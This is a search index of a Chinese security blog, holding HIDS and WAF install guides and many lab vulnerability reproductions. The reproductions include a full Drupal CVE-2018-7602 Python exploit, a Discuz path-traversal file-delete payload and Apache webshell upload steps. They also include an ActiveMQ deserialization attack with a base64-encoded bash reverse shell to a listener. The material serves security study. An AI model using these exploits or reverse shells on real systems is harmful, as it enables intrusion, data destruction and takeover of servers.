<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[centos7安装搭建驭龙hids]]></title>
    <url>%2F2019%2F06%2F24%2Fcentos7%E5%AE%89%E8%A3%85%E6%90%AD%E5%BB%BA%E9%A9%AD%E9%BE%99hids%2F</url>
    <content type="text"><![CDATA[###部署流程部署 MongoDB (3.x，驭龙不兼容2.x版本)；部署 Elasticsearch (5.x，驭龙暂不兼容6.x版本)；启动 MongoDB 、Elasticsearch；修改 web 的配置，启动 web ，在引导界面根据提示初始化数据库、规则等；启动 server（服务端）；部署 daemon （守护进程），启动 agent（客户端）。 1.部署 MongoDB (3.x，驭龙不兼容2.x版本)。下载对应安装包 https://www.mongodb.com/download-center?jmp=nav#community安装MongoDB并启动。mkdir /data/hids/mongodb/cd /usr/local/srcwget https://sec.ly.com/mirror/mongodb-linux-x86_64-3.6.3.tgztar -xvzf mongodb-linux-x86_64-3.6.3.tgzmongodb-linux-x86_64-3.6.3/bin/mongod –dbpath /data/hids/mongodb/ –logpath /var/log/mongodb.log –fork –bind_ip 192.168.110.160(你的IP)yum install -y mongodb-orgss -pantl 2.部署 Elasticsearch (5.x，驭龙暂不兼容6.x版本)下载安装jre依赖。wget https://sec.ly.com/mirror/jre-8u161-linux-x64.rpm &amp;&amp; yum -y localinstall jre-8u161-linux-x64.rpm下载ES并解压。wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-5.6.8.tar.gz &amp;&amp; tar -zxvf elasticsearch-5.6.8.tar.gzElasticsearch 不建议以 root 权限运行，新建一个非 root 权限用户，-p 后跟自行设定的密码。groupadd elasticsearch &amp;&amp; useradd elasticsearch -g elasticsearch -p ElasticSearch666修改文件夹及内部文件的所属用户及组为 elasticsearch:elasticsearchchown -R elasticsearch:elasticsearch /data/hids/elasticsearch-5.6.8centos7 以下的系统需编辑 config/elasticsearch.yml 添加bootstrap.system_call_filter: false启动essu - elasticsearch -c ‘/data/hids/elasticsearch-5.6.8/bin/elasticsearch -d’查看进程，开启成功。curl请求下确认ES启动成功curl -XGET -s “http://localhost:9200/_cluster/health?pretty&quot; 3.安装设置 web将驭龙编译好的包上传到/data/hids/web中，并解压到/data/hids/web中chmod 755 server web/webvim /data/hids/web/web/conf/app.conf修改登陆web管理界面的密码。密码自己设置为MD5的加密信息我改的是 123 md5值32位。设置完密码后继续修改配置文件是否开启二次验证，这里二次验证需要Google的APP配置使用。主要是对敏感操作进行权限管理因为测试阶段，所以没有开启二次验证修改mongodb的地址和es的地址为安装地址启动web:cd web/./web或者后台启动：nohup ./web &amp;ss –antpl查看80 443端口是否开启 4.Web安装向导指南在安装完成后，访问安装服务器的地址，使用https协议，端口443。点击初始化，初始化数据库。初始化规则, 规则可以自己编写，也可以使用默认规则。初始化规则我一会单写一篇文章。第三步上传文件包，文件包内包含着 agent, daemon, data 三个文件， 可从 release 里面找到对应的压缩包上传。最好三个系统版本全部上传，不然后续无法增加新的系统版本。该压缩包可以在对应的系统下，使用 /build/build.py 生成。请注意查看编辑框内的提示信息，填写相应内容。点击生成“生成证书”按钮，如果 web 是运行在linux下的话，应该可以直接生成证书，如果不是linux的话，可下载私钥文件并使用提示命令生成证书，再将证书内容放置于编辑框内。 这就搭建完成了。]]></content>
      <tags>
        <tag>安装文档</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Discuz!X前台任意文件删除漏洞重现]]></title>
    <url>%2F2019%2F06%2F23%2FDiscuz!X%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%E9%87%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[漏洞背景：Discuz!X社区软件，是一个采用 PHP 和 MySQL 等其他多种数据库构建的性能优异、功能全面、安全稳定的社区论坛平台。 2017年9月29日，Discuz!修复了一个安全问题用于加强安全性，这个漏洞会导致前台用户可以导致任意删除文件漏洞。 2017年9月29日，知道创宇404 实验室开始应急，经过知道创宇404实验室分析确认，该漏洞于2014年6月被提交到 Wooyun漏洞平台，Seebug漏洞平台收录了该漏洞，漏洞编号 ssvid-93588。该漏洞通过配置属性值，导致任意文件删除。 经过分析确认，原有的利用方式已经被修复，添加了对属性的 formtype 判断，但修复方式不完全导致可以绕过，通过模拟文件上传可以进入其他 unlink 条件，实现任意文件删除漏洞。 漏洞复现：1.进入设置-个人资料，先在页面源代码找到formhash值，可以看到值为2599b5e52.开启一个插件HackbarPost数据：birthprovince=../../../importantfile.txt&amp;profilesubmit=1&amp;formhash=2599b5e5执行后会显示一片空白，你再刷新下或重新访问下就好了。3.出生地被修改成要删除的文件。最后构造表单执行删除文件生成.html，上面的需要自己修改。4.然后随便上传一张图片，就能删除自己要删除的。5.再访问回去看一下。复现成功。]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Drupal 远程代码执行漏洞（CVE-2018-7602）]]></title>
    <url>%2F2019%2F06%2F23%2FDrupal%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-7602%EF%BC%89%2F</url>
    <content type="text"><![CDATA[漏洞复现：1.如下图所示，执行以下命令即可复现该漏洞。示例命令为 id，如图红框中显示，可以执行该命令。“id”为要执行的命令 第一个drupal为用户名 第二个drupal为密码python3 drupa7-CVE-2018-7602.py -c “id” drupal drupal http://ip:8081/ 2.CVE-2018-7600的PoC。#!/usr/bin/env python3import requestsimport argparsefrom bs4 import BeautifulSoup def get_args():parser = argparse.ArgumentParser( prog=”drupa7-CVE-2018-7602.py”,formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50),epilog= ‘’’This script will exploit the (CVE-2018-7602) vulnerability in Drupal 7 &lt;= 7.58using an valid account and poisoning the cancel account form (user_cancel_confirm_form)with the ‘destination’ variable and triggering it with the upload file via ajax (/file/ajax).‘’’) parser.add_argument(“user”, help=”Username”)parser.add_argument(“password”, help=”Password”)parser.add_argument(“target”, help=”URL of target Drupal site (ex: http://target.com/)&quot;)parser.add_argument(“-c”, “–command”, default=”id”, help=”Command to execute (default = id)”)parser.add_argument(“-f”, “–function”, default=”passthru”, help=”Function to use as attack vector (default = passthru)”)parser.add_argument(“-x”, “–proxy”, default=””, help=”Configure a proxy in the format http://127.0.0.1:8080/ (default = none)”)args = parser.parse_args()return args def pwn_target(target, username, password, function, command, proxy):requests.packages.urllib3.disable_warnings()session = requests.Session()proxyConf = {‘http’: proxy, ‘https’: proxy}try:print(‘[] Creating a session using the provided credential…’)get_params = {‘q’:’user/login’}post_params = {‘form_id’:’user_login’, ‘name’: username, ‘pass’ : password, ‘op’:’Log in’}print(‘[] Finding User ID…’)session.post(target, params=get_params, data=post_params, verify=False, proxies=proxyConf)get_params = {‘q’:’user’}r = session.get(target, params=get_params, verify=False, proxies=proxyConf)soup = BeautifulSoup(r.text, “html.parser”)user_id = soup.find(‘meta’, {‘property’: ‘foaf:name’}).get(‘about’)if (“?q=” in user_id):user_id = user_id.split(“=”)[1]if(user_id):print(‘[] User ID found: ‘ + user_id)print(‘[] Poisoning a form using &#39;destination&#39; and including it in cache.’)get_params = {‘q’: user_id + ‘/cancel’}r = session.get(target, params=get_params, verify=False, proxies=proxyConf)soup = BeautifulSoup(r.text, “html.parser”)form = soup.find(‘form’, {‘id’: ‘user-cancel-confirm-form’})form_token = form.find(‘input’, {‘name’: ‘form_token’}).get(‘value’)get_params = {‘q’: user_id + ‘/cancel’, ‘destination’ : user_id +’/cancel?q[%23post_render][]=’ + function + ‘&amp;q[%23type]=markup&amp;q[%23markup]=’ + command }post_params = {‘form_id’:’user_cancel_confirm_form’,’form_token’: form_token, ‘_triggering_element_name’:’form_id’, ‘op’:’Cancel account’}r = session.post(target, params=get_params, data=post_params, verify=False, proxies=proxyConf)soup = BeautifulSoup(r.text, “html.parser”)form = soup.find(‘form’, {‘id’: ‘user-cancel-confirm-form’})form_build_id = form.find(‘input’, {‘name’: ‘form_build_id’}).get(‘value’)if form_build_id:print(‘[] Poisoned form ID: ‘ + form_build_id)print(‘[] Triggering exploit to execute: ‘ + command)get_params = {‘q’:’file/ajax/actions/cancel/#options/path/‘ + form_build_id}post_params = {‘form_build_id’:form_build_id}r = session.post(target, params=get_params, data=post_params, verify=False, proxies=proxyConf)parsed_result = r.text.split(‘[{“command”:”settings”‘)[0]print(parsed_result)except:print(“ERROR: Something went wrong.”)raise def main():print ()print (‘===================================================================================’)print (‘| DRUPAL 7 &lt;= 7.58 REMOTE CODE EXECUTION (SA-CORE-2018-004 / CVE-2018-7602) |’)print (‘| by pimps |’)print (‘===================================================================================\n’) args = get_args() # get the cl argspwn_target(args.target.strip(),args.user.strip(),args.password.strip(), args.function.strip(), args.command.strip(), args.proxy.strip()) if name == ‘main’:main() 3.然后再执行。]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS存储型漏洞]]></title>
    <url>%2F2019%2F06%2F23%2Fxss%E5%AD%98%E5%82%A8%E5%9E%8B%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[利用github搭建的博客网站，上传文章发现有xss存储型漏洞。漏洞复现：1.按照我的正常上传流程，使用markdown在线编辑器写文章，然后进行上传。如上图所示，打算上传一篇漏洞复现的文章。上传成功后，打开浏览器进行访问。发现存在xss存储型漏洞。然后使用其他机器进行尝试，发现同样可以弹窗。尝试修改payload，看看是否可以弹出cookie。成功弹出cookie。为了确认该漏洞是否全网站覆盖。找来了同事的博客进行上传尝试。如上图所示，随意写了一篇文章，里面构造了xss的payload，进行上传。上传成功后，浏览器进行访问。成功弹出。然后尝试在该网站进行嵌套。保存并上传，然后浏览器进行访问。按下F12键查看源代码，发现代码已经被成功解析。]]></content>
      <tags>
        <tag>发现漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Django debug page XSS漏洞（CVE-2017-12794）]]></title>
    <url>%2F2019%2F06%2F22%2FDjango%20debug%20page%20XSS%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12794%EF%BC%89%2F</url>
    <content type="text"><![CDATA[1.创建个用户：ip:8000/create_user/?username=alert(7)显示用户已创建。2.触发漏洞，再次访问ip:8000/create_user/?username=alert(7)3.触发异常：duplicate key value violates unique constraint “xss_user_username_key”DETAIL: Key (username)=(alert(7)) already exists.4.这个异常被拼接进The above exception () was the direct cause of the following exception，最后触发XSS。]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx+lua+ngx_lua_waf实现waf功能]]></title>
    <url>%2F2019%2F06%2F21%2Fnginx%2Blua%2Bngx_lua_waf%E5%AE%9E%E7%8E%B0waf%E5%8A%9F%E8%83%BD%2F</url>
    <content type="text"><![CDATA[用途： 防止sql注入，本地包含，部分溢出，fuzzing测试，xss,SSRF等web攻击 防止svn/备份之类文件泄漏 防止ApacheBench之类压力测试工具的攻击 屏蔽常见的扫描黑客工具，扫描器 屏蔽异常的网络请求 屏蔽图片附件类目录php执行权限 防止webshell上传1.下载并解压luajit 2.0.5wget http://luajit.org/download/LuaJIT-2.0.5.tar.gztar -zxvf LuaJIT-2.0.5.tar.gzcd LuaJIT-2.0.5make install PREFIX=/data/luajit（选自己的目录）2.软连接ln -s /usr/local/luajit/lib/libluajit-5.1.so.2 /lib64/libluajit-5.1.so.23.下载并解压ngx_devel_kitwget https://github.com/simpl/ngx_devel_kit/archive/v0.3.0.tar.gztar -zxvf v0.3.0.tar.gz4.下载并解压lua-nginx-modulewget https://github.com/openresty/lua-nginx-module/archive/v0.10.14rc3.tar.gztar -zxvf v0.10.14rc3.tar.gz5.编译安装nginx①下载依赖包yum install -y gcc gcc-c++ wget git geoip-devel gd-devel pcre-deve libcurl-devel libxml2 libxml2-devel libgd-devel openssl-devel②下载nginx包wget http://nginx.org/download/nginx-1.15.2.tar.gz③编译安装（目录看对了 选自己的目录）./configure –prefix=/data/nginx –error-log-path=/var/log/php-fpm/error.log –http-log-path=/phpstudy/server/nginx/logs/access.log –with-http_ssl_module –with-http_v2_module –with-http_realip_module –with-http_addition_module –with-http_image_filter_module –with-http_geoip_module –with-http_sub_module –with-http_dav_module –with-http_flv_module –with-http_mp4_module –with-http_gunzip_module –with-http_gzip_static_module –with-http_random_index_module –with-http_secure_link_module –with-http_degradation_module –with-http_slice_module –with-http_stub_status_module –with-pcre –with-pcre-jit –with-stream –with-stream_ssl_module –with-debug –add-module=/data/ngx_devel_kit-0.3.0 –add-module=/data/lua-nginx-module-0.10.14rc3 –with-ld-opt=”-Wl,-rpath,$LUAJIT_LIB” ;（报错的话 自己百度找问题 都有答案及详解的）④编译安装make &amp;&amp; make install6.将waf功能模块，解压后重命名为waf（并移动到nginx的配置目录下）mv /data/ngx_lua_waf-0.7.2/ wafcp -rf /data/waf/ /data/nginx/conf/7.修改waf模块的规则配置路径8.vim /data/nginx/conf/waf/config.luaRulePath = “/usr/local/nginx/conf/waf/wafconf/“–规则存放目录attacklog = “off”–是否开启信息记录，需要配置logdirlogdir = “/usr/local/nginx/logs/hack/“–log存储目录，该目录需要用户自己新建，切需要nginx用户的可写权限UrlDeny=”on”–是否拦截url访问Redirect=”on”–是否拦截后重定向CookieMatch = “on”–是否拦截cookiepostMatch = “on”–是否拦截post*whiteModule = “on”–是否开启URL白名单black_fileExt={“php”,”jsp”}–填写不允许上传文件后缀类型ipWhitelist={“127.0.0.1”}–ip白名单，多个ip用逗号分隔ipBlocklist={“1.0.0.1”}–ip黑名单，多个ip用逗号分隔CCDeny=”on”–是否开启拦截cc*(需要nginx.conf的http段增加lua_shared_dict limit 10m;)CCrate = “100/60”–设置cc***频率，单位为秒.–默认1分钟同一个IP只能请求同一个地址100次html=[[Please go away~~]]–警告内容,可在中括号内自定义备注:不要乱动双引号，区分大小写 9.修改nginx的配置文件使其加载waf功能模块,并加载博客的nginx配置文件vim /data/nginx/conf/nginx.confhttp里面添加如下lua_package_path “/data/nginx/conf/waf/config.lua”;lua_shared_dict limit 10m;init_by_lua_file /usr/local/nginx/conf/waf/init.lua;access_by_lua_file /usr/local/nginx/conf/waf/waf.lua;10.启动nginx设置开机启动systemctl start nginx.servicesystemctl enable nginx.service11.创建nginx软连接ln -s /usr/local/nginx/sbin/* /usr/local/sbin/12.http://你的IP/test.php?id=../etc/passwd]]></content>
      <tags>
        <tag>安装文档</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用Vulnhub复现漏洞 - Couchdb 垂直权限绕过漏洞（CVE-2017-12635）]]></title>
    <url>%2F2019%2F06%2F21%2F%E5%88%A9%E7%94%A8Vulnhub%E5%A4%8D%E7%8E%B0%E6%BC%8F%E6%B4%9E%20-%20Couchdb%20%E5%9E%82%E7%9B%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12635%EF%BC%89%2F</url>
    <content type="text"><![CDATA[漏洞原理：Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。 在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。 漏洞复现：捉包发送以后内容返回403错误，发送一次包含两个roles字段的数据包，即可绕过限制成功创建管理员，账户密码均为vulhub再次访问http://your-ip:5984/_utils/，输入账户密码nnn，可以成功登录。]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Apache Httpd 解析漏洞]]></title>
    <url>%2F2019%2F06%2F20%2FApache%20Httpd%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[漏洞背景：apache通过mod_php来运行脚本，其2.4.0-2.4.29中存在apache换行解析漏洞，在解析php时xxx.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。该漏洞属于用户配置不当产生的漏洞，与具体中间件版本无关。与其说这是漏洞，不如说是apache的特性，就是我们平常所说的从右向左解析是一样的。当apache遇到无法识别解析的文件后缀时，会向前解析，如xxx.php.123.456,在mime.types文件中如果不存在.123/.456这两种后缀，那么apache会将该文件解析为php。同样也可以在httpd.conf文件中更改参数或是直接配置.htaccess。1.这是个上传漏洞。2.直接上传个php一句话***后缀名为1.php.jgp，然后用蚁剑连接，就可以了。3.复制这个连接，去蚁剑上连接。4.连接上了。]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用最新Apache解析漏洞（CVE-2017-15715）绕过上传黑名单]]></title>
    <url>%2F2019%2F06%2F15%2F%E5%88%A9%E7%94%A8%E6%9C%80%E6%96%B0Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89%E7%BB%95%E8%BF%87%E4%B8%8A%E4%BC%A0%E9%BB%91%E5%90%8D%E5%8D%95%2F</url>
    <content type="text"><![CDATA[1.绕过黑名单getshell捉包，正常能上传php文件，但是上传失败。打开拦截流量Hex模式添加一个\x0a再次上传就没有，证明上传成功了。打开访问一下。成了。]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Appweb(CVE-2018-8715)漏洞复现]]></title>
    <url>%2F2019%2F06%2F15%2FAppweb(CVE-2018-8715)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[漏洞背景：Appweb是一个嵌入式HTTP Web服务器，主要的设计思路是安全。这是直接集成到客户的应用和设备，便于开发和部署基于Web的应用程序和设备。它迅速（ 每秒处理3500多要求）而紧凑 ，其中包括支持动态网页制作，服务器端嵌入式脚本过程中的CGI ，可加载模块的SSL ，摘要式身份验证，虚拟主机， Apache样式配置，日志记录，单和多线程应用程序。它提供了大量的文档和示例。 漏洞复现：1.访问自己的目标。2.获取用户名，这个就显现出此漏洞的局限性了。靶场里告诉了有一个账户是joshua。通过抓包软件拦截，添加以下HTTP 头信息后，发送数据包。Authorization: Digest username=joshua3.返回状态码为200后，获取HTTP 头信息中的session。4.通过抓包软件拦截，发送POST请求，添加session到HTTP 头信息和用户名后，发送数据包。5.成了。]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Apache ActiveMQ 远程代码执行漏洞 (CVE-2016-3088)分析]]></title>
    <url>%2F2019%2F06%2F13%2FApache%20ActiveMQ%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20(CVE-2016-3088)%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[1.漏洞背景：ActiveMQ 是 Apache 软件基金会下的一个开源消息驱动中间件软件。Jetty 是一个开源的 servlet 容器，它为基于 Java 的 web 容器，例如 JSP 和 servlet 提供运行环境。ActiveMQ 5.0 及以后版本默认集成了jetty。在启动后提供一个监控 ActiveMQ 的 Web 应用。 2016年4月14日，国外安全研究人员 Simon Zuckerbraun 曝光 Apache ActiveMQ Fileserver 存在多个安全漏洞，可使远程***者用恶意代码替代Web应用，在受影响系统上执行远程代码（CVE-2016-3088）。8161端口为web控制台端口，本漏洞就出现在web控制台中。ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：其使用率并不高而且文件操作容易出现漏洞。所以，ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。 2.漏洞利用：首先 PUT 一个 Jsp 的 Webshell 到 fileserver 目录下面添加的是生成一个jsp的***（msfvenom生成的payload）然后利用 MOVE 方法将 Webshell 移入 admin/ 目录（也可以利用相对路径）这时访问http://你的ip:8161/api/发现你的木马已经存在了。然后用kali监听，网站上执行，就能获得root权限。]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ActiveMQ反序列化漏洞(CVE-2015-5254)]]></title>
    <url>%2F2019%2F06%2F13%2FActiveMQ%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2015-5254)%2F</url>
    <content type="text"><![CDATA[1.漏洞介绍：Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程***者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码。 2.漏洞利用过程如下：①构造可执行命令的序列化对象②作为一个消息，发送到目标61616端口③访问web管理页面，读取信息，触发漏洞 3.漏洞复现：①.首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jarmkdir external②.执行命令java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “touch /tmp/sucess” -Yp ROME 靶机的ip 61616③.它会给你的ID，访问http://你的ip：8161:8161/admin/queues.jsp④.利用方式也很简单，我们只要将命令换成反弹shell语句再利用就行了。不过在这里我们需要一些小技巧来绕过Java的机制。bash -i &gt;&amp; /dev/tcp/靶机IP/8888 0&gt;&amp;1 bese64编码把编码放进去。bash -c {echo,CmJhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xOTkuMTkzLzg4ODggMD4mMQ==}|{base64,-d}|{bash,-i}⑤.然后我们是使用同样的命令将payload发送到61616端口。java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “bash -c {echo,CmJhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xOTkuMTkzLzg4ODggMD4mMQ==}|{base64,-d}|{bash,-i}” -Yp ROME 靶机ip 61616⑥.然后我们查看这条消息，触发命令执行，这时我们在靶机上监听端口，即可得到shell。⑦.成功。]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
</search>
